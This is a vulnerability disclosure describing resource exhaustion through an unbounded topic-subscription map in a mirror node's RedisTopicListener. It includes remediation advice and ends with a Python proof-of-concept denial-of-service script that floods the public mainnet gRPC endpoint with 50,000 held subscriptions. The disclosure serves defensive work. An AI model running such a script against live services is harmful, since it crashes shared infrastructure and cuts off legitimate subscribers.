### Title
Unbounded `topicMessages` ConcurrentHashMap in `RedisTopicListener` Enables Resource Exhaustion via Distinct Topic Subscriptions

### Summary
`RedisTopicListener` stores one `Flux<TopicMessage>` entry per distinct topic ID in an unbounded `ConcurrentHashMap`. Entries are only removed when all subscribers to a topic disconnect. An attacker who opens and holds many gRPC connections—each subscribing to a different valid topic ID—can grow the map indefinitely, exhausting JVM heap and Redis channel subscriptions, crashing the service and severing all active financial subscribers.

### Finding Description

**Exact code location:**

`grpc/src/main/java/org/hiero/mirror/grpc/listener/RedisTopicListener.java`

- Line 43: `this.topicMessages = new ConcurrentHashMap<>();` — no capacity bound, no eviction policy.
- Lines 59–62 (`getSharedListener`): `topicMessages.computeIfAbsent(topic.getTopic(), key -> subscribe(topic))` — every distinct topic ID that reaches this method creates a new map entry and a new Redis channel subscription via `r.receive(...)`.
- Lines 82–85 (`unsubscribe`): `topicMessages.remove(topic.getTopic())` — removal only fires via `doOnCancel` / `doOnComplete` on the shared Flux, i.e., only when the last subscriber for that topic disconnects.

**Root cause:** The map is keyed by topic ID string and is never bounded. The cleanup path (`unsubscribe`) is conditional on the reactive lifecycle of each per-topic shared Flux. As long as at least one subscriber per topic remains connected, the entry—and its backing Redis channel subscription—persists.

**Exploit flow:**

1. Attacker opens N concurrent gRPC connections to `ConsensusController.subscribeTopic`.
2. Each connection uses a distinct, valid topic ID (enumerable on a public network).
3. `TopicMessageServiceImpl.subscribeTopic` calls `topicExists`, which passes for valid IDs, then subscribes to the live `Flux` pipeline.
4. `incomingMessages` → `topicListener.listen` → `RedisTopicListener.getSharedListener` → `computeIfAbsent` adds a new entry and calls `subscribe(topic)`, which issues a new `ReactiveRedisMessageListenerContainer.receive(...)` channel subscription.
5. Attacker keeps all N connections open. The map holds N entries; the Redis container holds N active channel subscriptions.
6. JVM heap and Redis client memory grow proportionally to N until OOM or Redis connection exhaustion crashes the process.

**Why existing checks are insufficient:**

- `topicExists` (lines 94–105 of `TopicMessageServiceImpl`) validates that the topic is a real entity. This is the only gate. It does **not** limit how many distinct topics a single client or the system as a whole may subscribe to simultaneously.
- `subscriberCount` (line 48, `TopicMessageServiceImpl`) is a Micrometer gauge for observability only — it enforces no cap.
- `ListenerProperties.maxBufferSize` / `prefetch` govern per-subscriber backpressure, not map cardinality.
- There is no per-IP, per-client, or global subscription-count limit in the gRPC layer.

### Impact Explanation
Each map entry carries a live Redis pub/sub channel subscription. At scale (tens of thousands of entries), the combined heap pressure from Reactor internals, Redis subscription state, and the map itself can exhaust the JVM heap. An OOM crash terminates all in-flight gRPC streams, causing every financial subscriber monitoring fund-transfer topics to lose their connection and miss messages during the outage window. Because the service uses `Retry.backoff(Long.MAX_VALUE, ...)` for Redis reconnection, recovery is slow and the window of missed messages is extended.

### Likelihood Explanation
A single attacker machine can open thousands of concurrent gRPC/HTTP2 streams. Valid Hedera topic IDs are publicly enumerable via the REST API. No authentication is required to call `subscribeTopic` on the mirror node gRPC endpoint. The attack is repeatable: after a crash and restart, the attacker can immediately re-execute. The only practical friction is knowing enough valid topic IDs, which is trivially solved by querying `/api/v1/topics`.

### Recommendation

1. **Bound the map**: Replace `ConcurrentHashMap` with a size-limited structure (e.g., a Caffeine cache with a maximum entry count and TTL-based eviction) so stale or excess entries are evicted automatically.
2. **Enforce a global subscription cap**: Add an `AtomicInteger` tracking the number of distinct active topic subscriptions; reject new subscriptions beyond a configurable threshold.
3. **Per-client subscription limit**: Implement a gRPC `ServerInterceptor` that tracks and caps the number of concurrent streams per remote IP.
4. **Per-topic subscriber cap**: Before calling `computeIfAbsent`, check whether the topic already has an active shared Flux; if not, verify the global cap has not been reached.

### Proof of Concept

```python
import grpc
import threading
from hedera import consensus_service_pb2, consensus_service_pb2_grpc, timestamp_pb2, basic_types_pb2

MIRROR_GRPC = "mainnet-public.mirrornode.hedera.com:443"
# Enumerate valid topic IDs from REST API first
TOPIC_IDS = list(range(1, 50001))  # 50,000 distinct topic IDs

channels = []
def subscribe(topic_num):
    channel = grpc.secure_channel(MIRROR_GRPC, grpc.ssl_channel_credentials())
    channels.append(channel)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    req = consensus_service_pb2.ConsensusTopicQuery(
        topicID=basic_types_pb2.TopicID(topicNum=topic_num),
        consensusStartTime=timestamp_pb2.Timestamp(seconds=0, nanos=0)
    )
    try:
        for _ in stub.subscribeTopic(req):  # blocks, keeping connection open
            pass
    except Exception:
        pass

threads = [threading.Thread(target=subscribe, args=(t,), daemon=True) for t in TOPIC_IDS]
for t in threads:
    t.start()
# All threads hold open connections; RedisTopicListener.topicMessages grows to 50,000 entries
# with 50,000 Redis channel subscriptions, exhausting heap and Redis client resources.
for t in threads:
    t.join()
```

Each open thread holds a gRPC stream, keeping the corresponding `topicMessages` entry and Redis subscription alive. With sufficient topic IDs the JVM OOM-kills the mirror node process.
